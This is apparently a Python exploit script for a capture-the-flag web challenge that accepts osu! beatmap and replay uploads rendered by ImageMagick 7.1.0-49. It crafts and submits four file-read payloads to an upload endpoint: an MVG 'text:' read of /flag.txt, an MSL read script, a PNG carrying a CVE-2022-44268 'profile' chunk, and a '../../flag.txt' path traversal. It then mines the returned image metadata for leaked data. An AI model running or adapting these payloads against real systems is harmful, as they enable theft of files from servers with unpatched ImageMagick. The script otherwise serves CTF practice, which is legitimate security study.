#!/usr/bin/env python3
"""
Advanced exploit script for web_scorepost-generator CTF challenge
Exploits ImageMagick 7.1.0-49 vulnerabilities

This script tries multiple exploitation techniques:
1. Text protocol to read /flag.txt
2. MSL injection
3. Shell delegate exploitation
4. Path traversal in background path
"""

import hashlib
import zipfile
import io
import requests
import struct
import argparse
import base64

class OSUExploit:
    def __init__(self, target_url):
        self.target_url = target_url

    def write_uleb128(self, buffer, value):
        """Write ULEB128 encoded integer"""
        if value == 0:
            buffer.write(b'\x00')
            return

        while value > 0:
            byte = value & 0x7F
            value >>= 7
            if value != 0:
                byte |= 0x80
            buffer.write(bytes([byte]))

    def write_string(self, buffer, s):
        """Write string in .osr format"""
        if not s:
            buffer.write(b'\x00')
        else:
            buffer.write(b'\x0b')  # String indicator
            encoded = s.encode('utf-8')
            self.write_uleb128(buffer, len(encoded))
            buffer.write(encoded)

    def create_osr_replay(self, beatmap_hash, username="pwned"):
        """Creates a valid .osr replay file"""
        replay_data = io.BytesIO()

        # Game mode (0 = osu!standard)
        replay_data.write(struct.pack('<B', 0))

        # Version
        replay_data.write(struct.pack('<I', 20240101))

        # Beatmap MD5 hash
        self.write_string(replay_data, beatmap_hash)

        # Player name
        self.write_string(replay_data, username)

        # Replay MD5 hash
        self.write_string(replay_data, "d" * 32)

        # Counts
        replay_data.write(struct.pack('<H', 100))  # count300
        replay_data.write(struct.pack('<H', 10))   # count100
        replay_data.write(struct.pack('<H', 5))    # count50
        replay_data.write(struct.pack('<H', 20))   # countGeki
        replay_data.write(struct.pack('<H', 8))    # countKatu
        replay_data.write(struct.pack('<H', 0))    # countMiss

        # Total score
        replay_data.write(struct.pack('<I', 1337000))

        # Max combo
        replay_data.write(struct.pack('<H', 500))

        # Perfect combo
        replay_data.write(struct.pack('<B', 0))

        # Mods used
        replay_data.write(struct.pack('<I', 0))

        # Life bar graph
        self.write_string(replay_data, "")

        # Timestamp
        replay_data.write(struct.pack('<Q', 638000000000000000))

        # Replay data length
        replay_data.write(struct.pack('<I', 0))

        # Online score ID
        replay_data.write(struct.pack('<Q', 0))

        return replay_data.getvalue()

    def create_osu_beatmap(self, bg_filename="bg.png"):
        """Creates a .osu beatmap file"""
        osu_content = f"""osu file format v14

[General]
AudioFilename: audio.mp3
AudioLeadIn: 0
PreviewTime: -1
Countdown: 0
SampleSet: Normal
StackLeniency: 0.7
Mode: 0
LetterboxInBreaks: 0
WidescreenStoryboard: 1

[Editor]
DistanceSpacing: 1
BeatDivisor: 4
GridSize: 4
TimelineZoom: 1

[Metadata]
Title:Exploit
TitleUnicode:Exploit
Artist:CTF
ArtistUnicode:CTF
Creator:Pwner
Version:Hard
Source:
Tags:imagemagick rce
BeatmapID:0
BeatmapSetID:0

[Difficulty]
HPDrainRate:5
CircleSize:4
OverallDifficulty:7
ApproachRate:9
SliderMultiplier:1.4
SliderTickRate:1

[Events]
//Background and Video events
0,0,"{bg_filename}",0,0

[TimingPoints]
0,300,4,2,0,50,1,0

[HitObjects]
256,192,1000,1,0,0:0:0:0:
"""
        return osu_content.encode()

    def payload_text_protocol(self):
        """
        Payload 1: Use ImageMagick text: protocol to read files
        """
        # Create a file that uses text: protocol
        payload = b'push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 "text:/flag.txt"\npop graphic-context'
        return payload, "bg.mvg"

    def payload_msl_read(self):
        """
        Payload 2: MSL (Magick Scripting Language) to read flag
        """
        msl = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="text:/flag.txt"/>
</image>'''
        return msl.encode(), "bg.msl"

    def payload_eph_exploit(self):
        """
        Payload 3: Ephemeral coder exploit (CVE-2022-44268)
        This embeds a file path that ImageMagick will try to read
        """
        # PNG with tEXt chunk containing file path
        # When ImageMagick processes this, it may leak file contents
        png_header = b'\x89PNG\r\n\x1a\n'

        # IHDR chunk
        ihdr = b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'

        # tEXt chunk with profile containing /flag.txt
        # This exploits CVE-2022-44268 - arbitrary file read
        text_data = b'profile\x00/flag.txt'
        text_chunk = struct.pack('>I', len(text_data)) + b'tEXt' + text_data
        text_crc = self.crc32(b'tEXt' + text_data)
        text_chunk += struct.pack('>I', text_crc)

        # IDAT chunk
        idat = b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4'

        # IEND chunk
        iend = b'\x00\x00\x00\x00IEND\xaeB`\x82'

        png = png_header + ihdr + text_chunk + idat + iend
        return png, "bg.png"

    def payload_path_traversal(self):
        """
        Payload 4: Path traversal to read flag directly
        Note: This exploits the zip.file() call with unsanitized path
        """
        # Use a simple PNG but set background path to traverse
        png = self.create_minimal_png()
        # The background path will be set to ../../flag.txt in beatmap
        return png, "../../flag.txt"

    def create_minimal_png(self):
        """Creates a minimal 1x1 PNG"""
        png_data = (
            b'\x89PNG\r\n\x1a\n'
            b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
            b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01'
            b'\r\n-\xb4'
            b'\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        return png_data

    def crc32(self, data):
        """Calculate CRC32 for PNG chunks"""
        import zlib
        return zlib.crc32(data) & 0xffffffff

    def create_exploit_package(self, payload_type="text"):
        """
        Creates exploit package with specified payload type
        """
        print(f"[*] Using payload type: {payload_type}")

        # Select payload
        if payload_type == "text":
            bg_data, bg_filename = self.payload_text_protocol()
        elif payload_type == "msl":
            bg_data, bg_filename = self.payload_msl_read()
        elif payload_type == "cve":
            bg_data, bg_filename = self.payload_eph_exploit()
        elif payload_type == "path":
            bg_data, bg_filename = self.payload_path_traversal()
        else:
            print(f"[-] Unknown payload type: {payload_type}")
            bg_data = self.create_minimal_png()
            bg_filename = "bg.png"

        # Create beatmap
        beatmap_content = self.create_osu_beatmap(bg_filename)
        beatmap_hash = hashlib.md5(beatmap_content).hexdigest()

        print(f"[+] Beatmap MD5: {beatmap_hash}")

        # Create replay
        replay_content = self.create_osr_replay(beatmap_hash)

        # Create .osz archive
        osz_buffer = io.BytesIO()
        with zipfile.ZipFile(osz_buffer, 'w', zipfile.ZIP_DEFLATED) as osz:
            osz.writestr('beatmap.osu', beatmap_content)
            osz.writestr(bg_filename, bg_data)

        return osz_buffer.getvalue(), replay_content

    def exploit(self, payload_type="text", save_output=True):
        """
        Execute the exploit
        """
        print(f"[*] Target: {self.target_url}")

        osz_data, osr_data = self.create_exploit_package(payload_type)

        print(f"[+] Package sizes - OSZ: {len(osz_data)} bytes, OSR: {len(osr_data)} bytes")
        print(f"[*] Sending exploit to {self.target_url}/api/submit...")

        files = {
            'osz': ('exploit.osz', osz_data, 'application/zip'),
            'osr': ('exploit.osr', osr_data, 'application/octet-stream')
        }

        try:
            response = requests.post(
                f"{self.target_url}/api/submit",
                files=files,
                allow_redirects=True,
                timeout=30
            )

            print(f"[+] Status: {response.status_code}")

            if response.status_code == 200 and response.headers.get('Content-Type', '').startswith('image/'):
                if save_output:
                    filename = f'output_{payload_type}.png'
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    print(f"[+] Image saved to {filename}")

                    # Try to extract flag from image using ImageMagick identify
                    print("[*] Analyzing image for embedded data...")
                    try:
                        import subprocess
                        result = subprocess.run(
                            ['identify', '-verbose', filename],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                        if 'flag' in result.stdout.lower() or 'ctf' in result.stdout.lower():
                            print("[!] Potential flag data found in image metadata:")
                            for line in result.stdout.split('\n'):
                                if 'flag' in line.lower() or 'ctf' in line.lower():
                                    print(f"    {line}")
                    except:
                        pass

            else:
                print(f"[*] Response: {response.text[:500]}")

            return response

        except Exception as e:
            print(f"[-] Error: {e}")
            import traceback
            traceback.print_exc()
            return None


def main():
    parser = argparse.ArgumentParser(description='OSU Scorepost Generator Exploit')
    parser.add_argument('url', nargs='?', default='http://localhost:1337',
                        help='Target URL (default: http://localhost:1337)')
    parser.add_argument('-p', '--payload', choices=['text', 'msl', 'cve', 'path', 'all'],
                        default='all', help='Payload type to use')

    args = parser.parse_args()

    print("=" * 70)
    print(" ImageMagick RCE Exploit - web_scorepost-generator CTF Challenge")
    print("=" * 70)
    print()

    exploiter = OSUExploit(args.url)

    if args.payload == 'all':
        print("[*] Trying all payload types...\n")
        for payload in ['text', 'msl', 'cve', 'path']:
            print(f"\n{'='*70}")
            print(f" Attempting: {payload.upper()} payload")
            print('='*70)
            exploiter.exploit(payload)
            print()
    else:
        exploiter.exploit(args.payload)

    print("\n[*] Exploitation attempts complete!")
    print("[*] Check output_*.png files for results")
    print("[*] If exploited via CVE-2022-44268, use 'identify -verbose output_cve.png' to see leaked data")


if __name__ == "__main__":
    main()
